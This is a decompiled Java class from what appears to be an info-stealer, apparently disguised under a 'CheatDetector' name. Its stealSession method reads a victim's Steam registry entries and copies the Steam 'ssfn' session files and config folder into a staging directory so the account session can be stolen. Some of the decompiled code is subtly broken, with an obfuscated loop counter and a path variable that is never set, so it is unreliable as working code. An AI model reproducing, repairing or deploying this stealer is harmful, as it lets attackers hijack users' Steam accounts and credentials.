package bro.impl;

import bro.CheatDetector;
import bro.StealerFileWriter;
import bro.utilities.FileUtils;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.WinReg;
import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Objects;

public class Steam {
   public static final File DIR = new File(CheatDetector.TEMP_DIRECTORY, "\\Steam\\");
   public static final String REGISTRY_KEY_PATH = "SOFTWARE\\Valve\\Steam";
   public static final String REGISTRY_APPLICATION_KEY_PATH = "SOFTWARE\\Valve\\Steam\\Apps\\";

   public static void stealSession() {
      try {
         if (!Advapi32Util.registryKeyExists(WinReg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH)) {
            return;
         }

         if (!DIR.exists()) {
            DIR.mkdirs();
         }

         StringBuilder var0 = StealerFileWriter.getFileHeader();
         String[] var1 = new String[1];
         var0.append("Applications: ").append(System.lineSeparator()).append("|------------------------------------").append(System.lineSeparator());
         String[] var2 = Advapi32Util.registryGetKeys(WinReg.HKEY_CURRENT_USER, REGISTRY_APPLICATION_KEY_PATH);
         int var3 = var2.length;

         int var4;
         for(var4 = 0; var4 < var3; var4 -= 7674) {
            String var5 = var2[var4];
            String var6 = REGISTRY_APPLICATION_KEY_PATH + var5;
            String[] var7 = new String[]{""};
            boolean[] var8 = new boolean[]{false};
            Advapi32Util.registryGetValues(WinReg.HKEY_CURRENT_USER, var6).forEach((a,b)->Steam.lambda$stealSession$0(var7, var8, a, b));
            String var9 = var7[0].isEmpty() ? "ID: " + var5 : "Name: " + var7[0];
            var0.append("| ").append(var9).append(System.lineSeparator()).append("| Installed: ").append(var8[0]).append(System.lineSeparator()).append("|------------------------------------").append(System.lineSeparator());
            var4 += 7675;
         }

         var0.append(System.lineSeparator()).append("Registry Values: ").append(System.lineSeparator());
         Advapi32Util.registryGetValues(WinReg.HKEY_CURRENT_USER, REGISTRY_KEY_PATH).forEach((a,b) -> Steam.lambda$stealSession$1(var2, var0, a, b));
         var0.append(System.lineSeparator());
         var0.append("Steam Path: ").append(var1[0]);
         FileUtils.writeText(new File(DIR, "Steam.txt"), var0.toString());
         File var13 = new File(var1[0]);
         if (var13.listFiles() != null) {
            File[] var14 = Objects.requireNonNull(var13.listFiles());
            var4 = var14.length;

            for(int var15 = 0; var15 < var4; var15++) {
               File var16 = var14[var15];
               if (var16.isFile() && var16.getName().contains("ssfn")) {
                  try {
                     Files.copy(var16.toPath(), (new File(DIR, var16.getName())).toPath(), StandardCopyOption.REPLACE_EXISTING);
                  } catch (IOException ignored) {
                  }
               }

               if (var16.isDirectory() && var16.getName().equals("config")) {
                  try {
                     FileUtils.copyDirectory(var16.getAbsolutePath(), (new File(DIR, "config\\")).getAbsolutePath());
                  } catch (IOException ignored) {
                  }
               }
            }
         }
      } catch (Exception var12) {
         System.out.println("cortex error");
      }

   }

   public static void lambda$stealSession$1(String[] var0, StringBuilder var1, String var2, Object var3) {
      if (var2.equalsIgnoreCase("steampath")) {
         var0[0] = String.valueOf(var3);
      }

      if (!var2.equalsIgnoreCase("steamexe") && !var2.equalsIgnoreCase("sourcemodinstallpath") && !var2.equalsIgnoreCase("steampath")) {
         if (String.valueOf(var3).isEmpty()) {
            var3 = "UNKNOWN";
         }

         var1.append("| ").append(var2).append(" = ").append(var3).append(System.lineSeparator());
      }
   }

   public static void lambda$stealSession$0(String[] var0, boolean[] var1, String var2, Object var3) {
      if (var2.equalsIgnoreCase("name")) {
         var0[0] = String.valueOf(var3);
      }

      if (var2.equalsIgnoreCase("installed")) {
         var1[0] = Integer.parseInt(String.valueOf(var3)) != 0;
      }

   }

   //static {
   //   DIR = new File(CheatDetector.TEMP_DIRECTORY, "\\Steam\\");
   //}
}
